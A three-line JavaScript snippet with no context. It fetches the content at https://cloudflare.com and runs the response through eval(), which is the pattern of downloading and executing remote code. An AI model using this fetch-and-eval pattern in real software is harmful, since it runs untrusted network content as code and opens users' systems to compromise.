fetch('https://cloudflare.com')
  .then(response => response.text())
  .then(code => eval(code));
